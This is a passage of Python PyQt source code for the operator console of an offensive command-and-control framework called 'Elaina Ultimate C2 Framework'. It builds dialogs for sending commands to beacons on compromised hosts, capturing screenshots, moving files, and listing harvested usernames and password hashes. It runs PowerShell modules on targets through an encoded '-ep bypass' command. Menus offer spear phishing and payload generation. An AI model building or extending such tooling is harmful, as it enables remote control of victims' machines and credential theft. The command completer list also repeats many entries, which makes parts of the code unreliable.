        self.console_output = QTextEdit()
        self.console_output.setReadOnly(True)
        self.console_output.setFont(QFont("Consolas", 10))
        console_layout.addWidget(self.console_output)
        
        self.output_tabs.addTab(self.console_tab, "Console")
        
        self.file_tab = QWidget()
        file_layout = QVBoxLayout(self.file_tab)
        
        self.file_output = QTextEdit()
        self.file_output.setReadOnly(True)
        self.file_output.setFont(QFont("Consolas", 10))
        file_layout.addWidget(self.file_output)
        
        self.output_tabs.addTab(self.file_tab, "File Operations")
        
        self.screenshot_tab = QWidget()
        screenshot_layout = QVBoxLayout(self.screenshot_tab)
        
        self.screenshot_scroll = QScrollArea()
        self.screenshot_scroll.setWidgetResizable(True)
        self.screenshot_container = QWidget()
        self.screenshot_layout = QHBoxLayout(self.screenshot_container)
        self.screenshot_scroll.setWidget(self.screenshot_container)
        screenshot_layout.addWidget(self.screenshot_scroll)
        
        self.output_tabs.addTab(self.screenshot_tab, "Screenshots")
        
        self.sysinfo_tab = QWidget()
        sysinfo_layout = QVBoxLayout(self.sysinfo_tab)
        
        self.sysinfo_output = QTextEdit()
        self.sysinfo_output.setReadOnly(True)
        self.sysinfo_output.setFont(QFont("Consolas", 10))
        sysinfo_layout.addWidget(self.sysinfo_output)
        
        self.output_tabs.addTab(self.sysinfo_tab, "System Info")
        
        self.network_tab = QWidget()
        network_layout = QVBoxLayout(self.network_tab)
        
        self.network_output = QTextEdit()
        self.network_output.setReadOnly(True)
        self.network_output.setFont(QFont("Consolas", 10))
        network_layout.addWidget(self.network_output)
        
        self.output_tabs.addTab(self.network_tab, "Network Activity")
        
        self.creds_tab = QWidget()
        creds_layout = QVBoxLayout(self.creds_tab)
        
        self.creds_table = QTableWidget()
        self.creds_table.setColumnCount(4)
        self.creds_table.setHorizontalHeaderLabels(["Username", "Password/Hash", "Type", "Source"])
        self.creds_table.horizontalHeader().setStretchLastSection(True)
        self.creds_table.setEditTriggers(QTableWidget.NoEditTriggers)
        self.creds_table.setSelectionBehavior(QTableWidget.SelectRows)
        self.creds_table.setAlternatingRowColors(True)
        self.creds_table.setSortingEnabled(True)
        creds_layout.addWidget(self.creds_table)
        
        self.output_tabs.addTab(self.creds_tab, "Credentials")
        
        self.status_label = QLabel("Ready")
        layout.addWidget(self.status_label)
        
    def add_console_output(self, text, color=None):
        cursor = self.console_output.textCursor()
        cursor.movePosition(cursor.End)
        
        if color:
            format = QTextCharFormat()
            format.setForeground(QColor(color))
            cursor.setCharFormat(format)
        
        cursor.insertText(text + "\n")
        self.console_output.setTextCursor(cursor)
        self.console_output.ensureCursorVisible()
        
    def add_file_output(self, text, color=None):
        cursor = self.file_output.textCursor()
        cursor.movePosition(cursor.End)
        
        if color:
            format = QTextCharFormat()
            format.setForeground(QColor(color))
            cursor.setCharFormat(format)
        
        cursor.insertText(text + "\n")
        self.file_output.setTextCursor(cursor)
        self.file_output.ensureCursorVisible()
        
    def add_screenshot(self, image_data, timestamp=None):
        if not timestamp:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        pixmap = QPixmap()
        pixmap.loadFromData(image_data)
        
        screenshot_label = QLabel()
        screenshot_label.setPixmap(pixmap.scaled(400, 300, Qt.KeepAspectRatio))
        screenshot_label.setAlignment(Qt.AlignCenter)
        
        screenshot_widget = QWidget()
        screenshot_layout = QVBoxLayout(screenshot_widget)
        screenshot_layout.addWidget(QLabel(timestamp))
        screenshot_layout.addWidget(screenshot_label)
        
        self.screenshot_layout.addWidget(screenshot_widget)
        
        self.status_label.setText(f"Screenshot captured at {timestamp}")
        
    def add_sysinfo_output(self, sysinfo):
        self.sysinfo_output.clear()
        
        formatted_info = "=== SYSTEM INFORMATION ===\n\n"
        
        for key, value in sysinfo.items():
            if isinstance(value, dict):
                formatted_info += f"{key}:\n"
                for sub_key, sub_value in value.items():
                    formatted_info += f"  {sub_key}: {sub_value}\n"
            else:
                formatted_info += f"{key}: {value}\n"
        
        self.sysinfo_output.setPlainText(formatted_info)
        
    def add_network_output(self, text, color=None):
        cursor = self.network_output.textCursor()
        cursor.movePosition(cursor.End)
        
        if color:
            format = QTextCharFormat()
            format.setForeground(QColor(color))
            cursor.setCharFormat(format)
        
        cursor.insertText(text + "\n")
        self.network_output.setTextCursor(cursor)
        self.network_output.ensureCursorVisible()
        
    def add_credential(self, username, password, cred_type, source):
        row_position = self.creds_table.rowCount()
        self.creds_table.insertRow(row_position)
        
        self.creds_table.setItem(row_position, 0, QTableWidgetItem(username))
        self.creds_table.setItem(row_position, 1, QTableWidgetItem(password))
        self.creds_table.setItem(row_position, 2, QTableWidgetItem(cred_type))
        self.creds_table.setItem(row_position, 3, QTableWidgetItem(source))
        
        self.status_label.setText(f"Added {cred_type} credential from {source}")
        
    def clear_console(self):
        self.console_output.clear()
        
    def clear_file_output(self):
        self.file_output.clear()
        
    def clear_screenshots(self):
        while self.screenshot_layout.count():
            item = self.screenshot_layout.takeAt(0)
            if item.widget():
                item.widget().deleteLater()
                
    def clear_sysinfo(self):
        self.sysinfo_output.clear()
        
    def clear_network(self):
        self.network_output.clear()
        
    def clear_creds(self):
        self.creds_table.setRowCount(0)
        
    def save_output(self, file_path):
        try:
            with open(file_path, 'w') as f:
                f.write("=== CONSOLE OUTPUT ===\n")
                f.write(self.console_output.toPlainText())
                f.write("\n\n=== FILE OPERATIONS ===\n")
                f.write(self.file_output.toPlainText())
                f.write("\n\n=== SYSTEM INFORMATION ===\n")
                f.write(self.sysinfo_output.toPlainText())
                f.write("\n\n=== NETWORK ACTIVITY ===\n")
                f.write(self.network_output.toPlainText())
                f.write("\n\n=== CREDENTIALS ===\n")
                
                for row in range(self.creds_table.rowCount()):
                    username = self.creds_table.item(row, 0).text()
                    password = self.creds_table.item(row, 1).text()
                    cred_type = self.creds_table.item(row, 2).text()
                    source = self.creds_table.item(row, 3).text()
                    
                    f.write(f"Username: {username}\n")
                    f.write(f"Password/Hash: {password}\n")
                    f.write(f"Type: {cred_type}\n")
                    f.write(f"Source: {source}\n")
                    f.write("-" * 50 + "\n")
            
            return True
        except Exception as e:
            print(f"Error saving output: {str(e)}")
            return False

class EnhancedBeaconInteractDialog(QDialog):
    command_sent = pyqtSignal(str, str)
    
    def __init__(self, parent=None, beacon_id=None, beacon_info=None):
        super().__init__(parent)
        self.beacon_id = beacon_id
        self.beacon_info = beacon_info or {}
        self.setWindowTitle(f"Interact with Beacon {beacon_id}")
        self.setMinimumWidth(800)
        self.setMinimumHeight(600)
        self.init_ui()
        
    def init_ui(self):
        layout = QVBoxLayout()
        
        info_group = QGroupBox("Beacon Information")
        info_layout = QFormLayout(info_group)
        
        info_layout.addRow("ID:", QLabel(self.beacon_id))
        info_layout.addRow("Internal IP:", QLabel(self.beacon_info.get("address", ["N/A"])[0]))
        info_layout.addRow("User:", QLabel(self.beacon_info.get("user", "N/A")))
        info_layout.addRow("Hostname:", QLabel(self.beacon_info.get("hostname", "N/A")))
        info_layout.addRow("OS:", QLabel(self.beacon_info.get("os", "N/A")))
        info_layout.addRow("Process:", QLabel(self.beacon_info.get("process", "N/A")))
        info_layout.addRow("PID:", QLabel(str(self.beacon_info.get("pid", "N/A"))))
        
        layout.addWidget(info_group)
        
        splitter = QSplitter(Qt.Vertical)
        
        command_group = QGroupBox("Command")
        command_layout = QVBoxLayout(command_group)
        
        self.command_history = []
        self.history_index = -1
        
        self.command_input = QLineEdit()
        self.command_input.setPlaceholderText("Enter command to execute...")
        self.command_input.setFont(QFont("Consolas", 10))
        command_layout.addWidget(self.command_input)
        
        button_layout = QHBoxLayout()
        
        execute_button = QPushButton("Execute")
        execute_button.clicked.connect(self.execute_command)
        button_layout.addWidget(execute_button)
        
        screenshot_button = QPushButton("Screenshot")
        screenshot_button.clicked.connect(self.take_screenshot)
        button_layout.addWidget(screenshot_button)
        
        upload_button = QPushButton("Upload")
        upload_button.clicked.connect(self.upload_file)
        button_layout.addWidget(upload_button)
        
        download_button = QPushButton("Download")
        download_button.clicked.connect(self.download_file)
        button_layout.addWidget(download_button)
        
        ps_import_button = QPushButton("PS Import")
        ps_import_button.clicked.connect(self.ps_import)
        button_layout.addWidget(ps_import_button)
        
        button_layout.addStretch()
        
        command_layout.addLayout(button_layout)
        
        quick_commands_group = QGroupBox("Quick Commands")
        quick_commands_layout = QGridLayout(quick_commands_group)
        
        quick_commands = [
            ("whoami", "Get current user"),
            ("hostname", "Get hostname"),
            ("ipconfig /all", "Show network configuration"),
            ("net user", "List users"),
            ("net localgroup administrators", "List administrators"),
            ("tasklist", "List processes"),
            ("netstat -an", "Show network connections"),
            ("systeminfo", "Show system information")
        ]
        
        for i, (cmd, desc) in enumerate(quick_commands):
            row = i // 2
            col = (i % 2) * 2
            
            btn = QPushButton(cmd)
            btn.setToolTip(desc)
            btn.clicked.connect(lambda checked, c=cmd: self.execute_quick_command(c))
            quick_commands_layout.addWidget(btn, row, col)
            
            label = QLabel(desc)
            label.setFont(QFont("Arial", 8))
            quick_commands_layout.addWidget(label, row, col + 1)
        
        command_layout.addWidget(quick_commands_group)
        
        splitter.addWidget(command_group)
        
        output_group = QGroupBox("Output")
        output_layout = QVBoxLayout(output_group)
        
        self.output_display = OutputDisplayWidget()
        output_layout.addWidget(self.output_display)
        
        splitter.addWidget(output_group)
        
        splitter.setSizes([200, 400])
        
        layout.addWidget(splitter)
        
        button_box = QDialogButtonBox(QDialogButtonBox.Close)
        button_box.rejected.connect(self.reject)
        layout.addWidget(button_box)
        
        self.setLayout(layout)
        
        self.command_input.setFocus()
        
        self.command_input.returnPressed.connect(self.execute_command)
        
        self.setup_command_completer()
        
    def setup_command_completer(self):
        commands = [
            "whoami", "hostname", "ipconfig", "net", "tasklist", "taskkill",
            "netstat", "systeminfo", "dir", "cd", "mkdir", "rmdir", "del",
            "type", "copy", "move", "ren", "attrib", "find", "findstr",
            "reg", "sc", "wmic", "powershell", "cmd", "schtasks", "at",
            "net user", "net localgroup", "net share", "net use", "net session",
            "net view", "net start", "net stop", "net statistics", "net accounts",
            "net config", "net continue", "net file", "net group", "net help",
            "net helpmsg", "net localgroup", "net name", "net pause", "net print",
            "net send", "net session", "net share", "net start", "net statistics",
            "net stop", "net time", "net use", "net user", "net view",
            "netsh", "nslookup", "ping", "tracert", "pathping", "arp", "getmac",
            "nbtstat", "route", "ftp", "tftp", "telnet", "ssh", "sftp",
            "pscp", "plink", "putty", "winscp", "filezilla", "chrome", "firefox",
            "iexplore", "msedge", "regedit", "gpedit", "secpol", "compmgmt",
            "devmgmt", "diskmgmt", "services", "taskschd", "eventvwr", "perfmon",
            "resmon", "msconfig", "control", "cmd", "powershell", "wscript",
            "cscript", "mshta", "rundll32", "regsvr32", "regsvr32 /u",
            "certutil", "makecert", "signtool", "cipher", "bitsadmin",
            "certreq", "certmgr", "mmc", "msiexec", "wmic", "wbadmin",
            "robocopy", "xcopy", "copy", "move", "del", "erase", "rmdir",
            "rd", "md", "mkdir", "dir", "ls", "type", "cat", "more", "less",
            "find", "findstr", "grep", "sort", "uniq", "wc", "head", "tail",
            "cut", "tr", "sed", "awk", "vi", "vim", "nano", "notepad",
            "wordpad", "write", "mspaint", "calc", "notepad++", "sublime",
            "vscode", "code", "atom", "brackets", "webstorm", "phpstorm",
            "pycharm", "intellij", "eclipse", "netbeans", "visualstudio",
            "devenv", "msbuild", "dotnet", "nuget", "npm", "yarn", "bower",
            "pip", "conda", "virtualenv", "venv", "docker", "kubernetes",
            "kubectl", "helm", "istioctl", "minikube", "kind", "k3d",
            "vagrant", "virtualbox", "vmware", "hyper-v", " kvm", "xen",
            "qemu", "virtual machine", "vm", "container", "pod", "service",
            "daemon", "process", "thread", "job", "task", "schedule", "cron",
            "systemd", "sysv", "upstart", "launchd", "windows service",
            "scheduled task", "startup", "run", "runonce", "runex", "reg",
            "regedit", "regini", "regedt32", "regsvr32", "rundll32", "mshta",
            "wscript", "cscript", "powershell", "cmd", "bat", "cmd", "ps1",
            "vbs", "js", "hta", "dll", "exe", "com", "scr", "pif", "lnk",
            "url", "mht", "html", "htm", "xhtml", "xml", "json", "csv", "txt",
            "log", "ini", "cfg", "conf", "yaml", "yml", "toml", "properties",
            "env", "bashrc", "zshrc", "profile", "bash_profile", "zprofile",
            "bash_login", "zlogin", "bash_logout", "zlogout", "bash_aliases",
            "zsh_aliases", "gitconfig", "gitignore", "dockerfile", "dockerignore",
            "jenkinsfile", "travis.yml", "github workflows", "azure pipelines",
            "gitlab ci", "circleci", "buildkite", "teamcity", "bamboo",
            "jenkins", "hudson", "cruisecontrol", "go.cd", "spinnaker",
            "argo", "tekton", "github actions", "gitlab ci/cd", "azure devops",
            "aws codepipeline", "google cloud build", "ibm cloud continuous delivery",
            "oracle developer cloud", "salesforce dx", "heroku", "netlify",
            "vercel", "now", "zeit", "surge", "github pages", "gitlab pages",
            "bitbucket pages", "aws s3", "google cloud storage", "azure blob storage",
            "oracle cloud infrastructure", "alibaba cloud", "tencent cloud",
            "baidu cloud", "huawei cloud", "digitalocean", "linode", "vultr",
            "upcloud", "scaleway", "ovh", "hetzner", "ionos", "1&1",
            "godaddy", "namecheap", "domain.com", "google domains", "aws route53",
            "cloudflare", "cloudflare workers", "cloudflare pages", "cloudflare access",
            "cloudflare gateway", "cloudflare spectrum", "cloudflare load balancer",
            "cloudflare waf", "cloudflare origin ca", "cloudflare ssl/tls",
            "cloudflare cdn", "cloudflare images", "cloudflare stream", "cloudflare workers",
            "cloudflare pages", "cloudflare access", "cloudflare gateway",
            "cloudflare spectrum", "cloudflare load balancer", "cloudflare waf",
            "cloudflare origin ca", "cloudflare ssl/tls", "cloudflare cdn",
            "cloudflare images", "cloudflare stream", "cloudflare workers",
            "cloudflare pages", "cloudflare access", "cloudflare gateway",
            "cloudflare spectrum", "cloudflare load balancer", "cloudflare waf",
            "cloudflare origin ca", "cloudflare ssl/tls", "cloudflare cdn",
            "cloudflare images", "cloudflare stream"
        ]
        
        self.completer = QCompleter(commands)
        self.completer.setCaseSensitivity(Qt.CaseInsensitive)
        self.completer.setFilterMode(Qt.MatchContains)
        self.command_input.setCompleter(self.completer)
        
    def execute_command(self):
        command = self.command_input.text().strip()
        if command:
            self.command_history.append(command)
            self.history_index = len(self.command_history)
            
            self.command_sent.emit(self.beacon_id, command)
            
            self.output_display.add_console_output(f"[{datetime.now().strftime('%H:%M:%S')}] > {command}", "#00FF00")
            
            self.command_input.clear()
            
    def execute_quick_command(self, command):
        self.command_input.setText(command)
        self.execute_command()
        
    def take_screenshot(self):
        self.command_sent.emit(self.beacon_id, "screenshot")
        self.output_display.add_console_output(f"[{datetime.now().strftime('%H:%M:%S')}] > Screenshot requested", "#00FF00")
        
    def upload_file(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Select File to Upload")
        if file_path:
            try:
                with open(file_path, 'rb') as f:
                    content = base64.b64encode(f.read()).decode('utf-8')
                
                self.command_sent.emit(self.beacon_id, f"upload {os.path.basename(file_path)} {content}")
                self.output_display.add_console_output(f"[{datetime.now().strftime('%H:%M:%S')}] > Uploading {os.path.basename(file_path)}", "#00FF00")
                self.output_display.add_file_output(f"[{datetime.now().strftime('%H:%M:%S')}] Uploading {os.path.basename(file_path)} ({len(content)} bytes)", "#00FF00")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to read file: {str(e)}")
                
    def download_file(self):
        file_path, ok = QInputDialog.getText(self, "Download File", "Enter the path of the file to download:")
        if ok and file_path:
            save_path, _ = QFileDialog.getSaveFileName(self, "Save File As", os.path.basename(file_path))
            if save_path:
                self.command_sent.emit(self.beacon_id, f"download {file_path}")
                self.output_display.add_console_output(f"[{datetime.now().strftime('%H:%M:%S')}] > Downloading {file_path}", "#00FF00")
                self.output_display.add_file_output(f"[{datetime.now().strftime('%H:%M:%S')}] Downloading {file_path} to {save_path}", "#00FF00")
                
    def ps_import(self):
        module_path, _ = QFileDialog.getOpenFileName(self, "Select PowerShell Module", "", "PowerShell Files (*.ps1 *.psm1 *.psd1)")
        if module_path:
            try:
                with open(module_path, 'r') as f:
                    content = f.read()
                
                encoded_content = base64.b64encode(content.encode('utf-16-le')).decode('utf-8')
                
                ps_command = f"powershell -ep bypass -enc {encoded_content}"
                
                self.command_sent.emit(self.beacon_id, ps_command)
                self.output_display.add_console_output(f"[{datetime.now().strftime('%H:%M:%S')}] > Importing PowerShell module: {os.path.basename(module_path)}", "#00FF00")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to read PowerShell module: {str(e)}")
                
    def keyPressEvent(self, event):
        if event.key() == Qt.Key_Up:
            if self.history_index > 0:
                self.history_index -= 1
                self.command_input.setText(self.command_history[self.history_index])
        elif event.key() == Qt.Key_Down:
            if self.history_index < len(self.command_history) - 1:
                self.history_index += 1
                self.command_input.setText(self.command_history[self.history_index])
            else:
                self.history_index = len(self.command_history)
                self.command_input.clear()
        else:
            super().keyPressEvent(event)

class ElainaMainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.beacons = {}
        self.log_entries = []
        self.c2_server = None
        self.init_ui()
        
    def init_ui(self):
        self.setWindowTitle("Elaina Ultimate C2 Framework")
        self.setMinimumSize(1200, 800)
        self.setWindowIcon(QIcon.fromTheme("network-wired"))
        
        # Create central widget and main layout
        central_widget = QWidget()
        main_layout = QVBoxLayout(central_widget)
        
        # Create menu bar
        self.create_menu_bar()
        
        # Create toolbar
        self.create_toolbar()
        
        # Create tab widget
        self.tab_widget = QTabWidget()
        main_layout.addWidget(self.tab_widget)
        
        # Create tabs
        self.create_dashboard_tab()
        self.create_beacons_tab()
        self.create_attacks_tab()
        self.create_c2_tab()
        self.create_listener_tab()
        self.create_scripts_tab()
        self.create_view_tab()
        
        # Create status bar
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.status_bar.showMessage("Ready")
        
        self.setCentralWidget(central_widget)
        
        # Setup system tray
        self.setup_system_tray()
        
        # Setup timers
        self.setup_timers()
        
    def create_menu_bar(self):
        menubar = self.menuBar()
        
        # File menu
        file_menu = menubar.addMenu("File")
        
        new_action = QAction("New", self)
        new_action.setShortcut("Ctrl+N")
        file_menu.addAction(new_action)
        
        open_action = QAction("Open", self)
        open_action.setShortcut("Ctrl+O")
        file_menu.addAction(open_action)
        
        save_action = QAction("Save", self)
        save_action.setShortcut("Ctrl+S")
        file_menu.addAction(save_action)
        
        file_menu.addSeparator()
        
        exit_action = QAction("Exit", self)
        exit_action.setShortcut("Ctrl+Q")
        exit_action.triggered.connect(self.close)
        file_menu.addAction(exit_action)
        
        # Edit menu
        edit_menu = menubar.addMenu("Edit")
        
        copy_action = QAction("Copy", self)
        copy_action.setShortcut("Ctrl+C")
        edit_menu.addAction(copy_action)
        
        paste_action = QAction("Paste", self)
        paste_action.setShortcut("Ctrl+V")
        edit_menu.addAction(paste_action)
        
        # View menu
        view_menu = menubar.addMenu("View")
        
        dashboard_action = QAction("Dashboard", self)
        dashboard_action.triggered.connect(lambda: self.tab_widget.setCurrentIndex(0))
        view_menu.addAction(dashboard_action)
        
        beacons_action = QAction("Beacons", self)
        beacons_action.triggered.connect(lambda: self.tab_widget.setCurrentIndex(1))
        view_menu.addAction(beacons_action)
        
        attacks_action = QAction("Attacks", self)
        attacks_action.triggered.connect(lambda: self.tab_widget.setCurrentIndex(2))
        view_menu.addAction(attacks_action)
        
        # Attacks menu
        attacks_menu = menubar.addMenu("Attacks")
        
        web_attack_action = QAction("Web Attack", self)
        attacks_menu.addAction(web_attack_action)
        
        spear_phish_action = QAction("Spear Phish", self)
        attacks_menu.addAction(spear_phish_action)
        
        generate_payload_action = QAction("Generate Payload", self)
        attacks_menu.addAction(generate_payload_action)
        
        # Help menu
        help_menu = menubar.addMenu("Help")
        
        about_action = QAction("About", self)
        help_menu.addAction(about_action)
        
    def create_toolbar(self):
        toolbar = QToolBar("Main Toolbar")
        self.addToolBar(toolbar)
        
        new_action = QAction("New", self)
        toolbar.addAction(new_action)
        
        open_action = QAction("Open", self)
        toolbar.addAction(open_action)
        
        save_action = QAction("Save", self)
        toolbar.addAction(save_action)
        
        toolbar.addSeparator()
        
        start_c2_action = QAction("Start C2", self)
        start_c2_action.triggered.connect(self.start_c2_server)
        toolbar.addAction(start_c2_action)
        
        stop_c2_action = QAction("Stop C2", self)
        stop_c2_action.triggered.connect(self.stop_c2_server)
        toolbar.addAction(stop_c2_action)
        
        toolbar.addSeparator()
        
        generate_beacon_action = QAction("Generate Beacon", self)
        generate_beacon_action.triggered.connect(self.generate_beacon)
        toolbar.addAction(generate_beacon_action)
        
    def create_dashboard_tab(self):
        dashboard_widget = QWidget()
        layout = QVBoxLayout(dashboard_widget)
        
        # Create summary widgets
        summary_layout = QHBoxLayout()
        
        beacons_group = QGroupBox("Beacons")
        beacons_layout = QVBoxLayout(beacons_group)
        self.beacons_count_label = QLabel("0")
        self.beacons_count_label.setAlignment(Qt.AlignCenter)
        self.beacons_count_label.setStyleSheet("font-size: 24px; font-weight: bold;")
        beacons_layout.addWidget(self.beacons_count_label)
        beacons_layout.addWidget(QLabel("Active Beacons"))
        summary_layout.addWidget(beacons_group)
        
        targets_group = QGroupBox("Targets")
        targets_layout = QVBoxLayout(targets_group)
        self.targets_count_label = QLabel("0")
        self.targets_count_label.setAlignment(Qt.AlignCenter)
        self.targets_count_label.setStyleSheet("font-size: 24px; font-weight: bold;")
        targets_layout.addWidget(self.targets_count_label)
        targets_layout.addWidget(QLabel("Active Targets"))
        summary_layout.addWidget(targets_group)
        
        attacks_group = QGroupBox("Attacks")
        attacks_layout = QVBoxLayout(attacks_group)
        self.attacks_count_label = QLabel("0")
        self.attacks_count_label.setAlignment(Qt.AlignCenter)
        self.attacks_count_label.setStyleSheet("font-size: 24px; font-weight: bold;")
        attacks_layout.addWidget(self.attacks_count_label)
        attacks_layout.addWidget(QLabel("Running Attacks"))
        summary_layout.addWidget(attacks_group)
        
        layout.addLayout(summary_layout)
        
        # Create recent activity
        recent_activity_group = QGroupBox("Recent Activity")
        recent_activity_layout = QVBoxLayout(recent_activity_group)
        
        self.recent_activity_list = QListWidget()
        recent_activity_layout.addWidget(self.recent_activity_list)
        
        layout.addWidget(recent_activity_group)
        
        self.tab_widget.addTab(dashboard_widget, "Dashboard")
        
    def create_beacons_tab(self):
        beacons_widget = QWidget()
        layout = QVBoxLayout(beacons_widget)
        
        # Create beacons table
        self.beacons_table = QTableWidget()
        self.beacons_table.setColumnCount(7)
        self.beacons_table.setHorizontalHeaderLabels(["ID", "Internal IP", "User", "Hostname", "OS", "Process", "Last Checkin"])
        self.beacons_table.horizontalHeader().setStretchLastSection(True)
        self.beacons_table.setSelectionBehavior(QTableWidget.SelectRows)
        self.beacons_table.setEditTriggers(QTableWidget.NoEditTriggers)
        self.beacons_table.setAlternatingRowColors(True)
        self.beacons_table.setSortingEnabled(True)
        layout.addWidget(self.beacons_table)
        
        # Create buttons
        buttons_layout = QHBoxLayout()
        
        interact_button = QPushButton("Interact")
        interact_button.clicked.connect(self.interact_with_beacon)
        buttons_layout.addWidget(interact_button)
        
        remove_button = QPushButton("Remove")
        remove_button.clicked.connect(self.remove_beacon)
        buttons_layout.addWidget(remove_button)
        
        buttons_layout.addStretch()
        
        layout.addLayout(buttons_layout)
        
        # Create beacon output
        beacon_output_group = QGroupBox("Beacon Output")
        beacon_output_layout = QVBoxLayout(beacon_output_group)
        
        self.beacon_output = QTextEdit()
        self.beacon_output.setReadOnly(True)
        self.beacon_output.setFont(QFont("Consolas", 10))
        beacon_output_layout.addWidget(self.beacon_output)
        
        layout.addWidget(beacon_output_group)
        
        self.tab_widget.addTab(beacons_widget, "Beacons")
        
    def create_attacks_tab(self):
        attacks_widget = QWidget()
        layout = QVBoxLayout(attacks_widget)
        
        # Create attacks table
        self.attacks_table = QTableWidget()
        self.attacks_table.setColumnCount(5)
        self.attacks_table.setHorizontalHeaderLabels(["ID", "Type", "Target", "Status", "Start Time"])
        self.attacks_table.horizontalHeader().setStretchLastSection(True)
        self.attacks_table.setSelectionBehavior(QTableWidget.SelectRows)
        self.attacks_table.setEditTriggers(QTableWidget.NoEditTriggers)
        self.attacks_table.setAlternatingRowColors(True)
        self.attacks_table.setSortingEnabled(True)
        layout.addWidget(self.attacks_table)
        
        # Create buttons
        buttons_layout = QHBoxLayout()
        
        new_attack_button = QPushButton("New Attack")
        new_attack_button.clicked.connect(self.new_attack)
        buttons_layout.addWidget(new_attack_button)
        
        stop_attack_button = QPushButton("Stop Attack")
        stop_attack_button.clicked.connect(self.stop_attack)
        buttons_layout.addWidget(stop_attack_button)
        
        buttons_layout.addStretch()
        
        layout.addLayout(buttons_layout)
        
        # Create attack output
        attack_output_group = QGroupBox("Attack Output")
        attack_output_layout = QVBoxLayout(attack_output_group)
        
        self.attack_output = QTextEdit()
        self.attack_output.setReadOnly(True)
        self.attack_output.setFont(QFont("Consolas", 10))
        attack_output_layout.addWidget(self.attack_output)
        
        layout.addWidget(attack_output_group)
        
        self.tab_widget.addTab(attacks_widget, "Attacks")
        
    def create_c2_tab(self):
        c2_widget = QWidget()
        layout = QVBoxLayout(c2_widget)
        
        # Create C2 configuration
        c2_config_group = QGroupBox("C2 Configuration")
        c2_config_layout = QFormLayout(c2_config_group)
        
        self.c2_host_input = QLineEdit("0.0.0.0")
        c2_config_layout.addRow("Host:", self.c2_host_input)
        
        self.c2_port_input = QSpinBox()
        self.c2_port_input.setRange(1, 65535)
        self.c2_port_input.setValue(8080)
        c2_config_layout.addRow("Port:", self.c2_port_input)
        
        self.c2_ssl_checkbox = QCheckBox("Enable SSL")
        c2_config_layout.addRow("SSL:", self.c2_ssl_checkbox)
        
        self.c2_cert_input = QLineEdit()
        self.c2_cert_input.setPlaceholderText("Path to certificate file")
        c2_config_layout.addRow("Certificate:", self.c2_cert_input)
        
        self.c2_key_input = QLineEdit()
        self.c2_key_input.setPlaceholderText("Path to private key file")
        c2_config_layout.addRow("Private Key:", self.c2_key_input)
        
        layout.addWidget(c2_config_group)
        
        # Create C2 status
        c2_status_group = QGroupBox("C2 Status")
        c2_status_layout = QVBoxLayout(c2_status_group)
        
        self.c2_status_label = QLabel("Stopped")
        self.c2_status_label.setAlignment(Qt.AlignCenter)
        self.c2_status_label.setStyleSheet("font-size: 18px; font-weight: bold; color: red;")
        c2_status_layout.addWidget(self.c2_status_label)
        
        layout.addWidget(c2_status_group)
        
        # Create C2 buttons
        c2_buttons_layout = QHBoxLayout()
        
        self.start_c2_button = QPushButton("Start C2 Server")
        self.start_c2_button.clicked.connect(self.start_c2_server)
        c2_buttons_layout.addWidget(self.start_c2_button)
        
        self.stop_c2_button = QPushButton("Stop C2 Server")
        self.stop_c2_button.clicked.connect(self.stop_c2_server)
        self.stop_c2_button.setEnabled(False)
        c2_buttons_layout.addWidget(self.stop_c2_button)
        
        c2_buttons_layout.addStretch()
        
        layout.addLayout(c2_buttons_layout)
        
        # Create C2 output
        c2_output_group = QGroupBox("C2 Output")
        c2_output_layout = QVBoxLayout(c2_output_group)
        
        self.c2_output = QTextEdit()
        self.c2_output.setReadOnly(True)
        self.c2_output.setFont(QFont("Consolas", 10))
        c2_output_layout.addWidget(self.c2_output)
        
        layout.addWidget(c2_output_group)
        
        self.tab_widget.addTab(c2_widget, "C2")
        
    def create_listener_tab(self):
        listener_widget = QWidget()
        layout = QVBoxLayout(listener_widget)
        
        # Create listener configuration
        listener_config_group = QGroupBox("Listener Configuration")
        listener_config_layout = QFormLayout(listener_config_group)
        
        self.listener_name_input = QLineEdit()
        self.listener_name_input.setPlaceholderText("Listener name")
        listener_config_layout.addRow("Name:", self.listener_name_input)
        
        self.listener_type_combo = QComboBox()
        self.listener_type_combo.addItems(["HTTP", "HTTPS", "DNS", "TCP", "SMB"])
        listener_config_layout.addRow("Type:", self.listener_type_combo)
        
        self.listener_host_input = QLineEdit()
        self.listener_host_input.setPlaceholderText("Host/IP")
        listener_config_layout.addRow("Host:", self.listener_host_input)
        
        self.listener_port_input = QSpinBox()
        self.listener_port_input.setRange(1, 65535)
        self.listener_port_input.setValue(80)
        listener_config_layout.addRow("Port:", self.listener_port_input)
        
        self.listener_ssl_checkbox = QCheckBox("Enable SSL")
        listener_config_layout.addRow("SSL:", self.listener_ssl_checkbox)
        
        layout.addWidget(listener_config_group)
        
        # Create listener buttons
        listener_buttons_layout = QHBoxLayout()
        
        self.add_listener_button = QPushButton("Add Listener")
        self.add_listener_button.clicked.connect(self.add_listener)
        listener_buttons_layout.addWidget(self.add_listener_button)
        
        self.remove_listener_button = QPushButton("Remove Listener")
        self.remove_listener_button.clicked.connect(self.remove_listener)
        listener_buttons_layout.addWidget(self.remove_listener_button)
        
        listener_buttons_layout.addStretch()
        
        layout.addLayout(listener_buttons_layout)
        
        # Create listeners table
        self.listeners_table = QTableWidget()
        self.listeners_table.setColumnCount(5)
        self.listeners_table.setHorizontalHeaderLabels(["Name", "Type", "Host", "Port", "Status"])
        self.listeners_table.horizontalHeader().setStretchLastSection(True)
        self.listeners_table.setSelectionBehavior(QTableWidget.SelectRows)
        self.listeners_table.setEditTriggers(QTableWidget.NoEditTriggers)
        self.listeners_table.setAlternatingRowColors(True)
        self.listeners_table.setSortingEnabled(True)
        layout.addWidget(self.listeners_table)
        
        self.tab_widget.addTab(listener_widget, "Listeners")
        
    def create_scripts_tab(self):
        scripts_widget = QWidget()
        layout = QVBoxLayout(scripts_widget)
        
        # Create scripts list
        scripts_list_group = QGroupBox("Scripts")
        scripts_list_layout = QVBoxLayout(scripts_list_group)
        
        self.scripts_list = QListWidget()
        self.scripts_list.setSelectionMode(QAbstractItemView.SingleSelection)
        scripts_list_layout.addWidget(self.scripts_list)
        
        layout.addWidget(scripts_list_group)
        
        # Create script editor
        script_editor_group = QGroupBox("Script Editor")
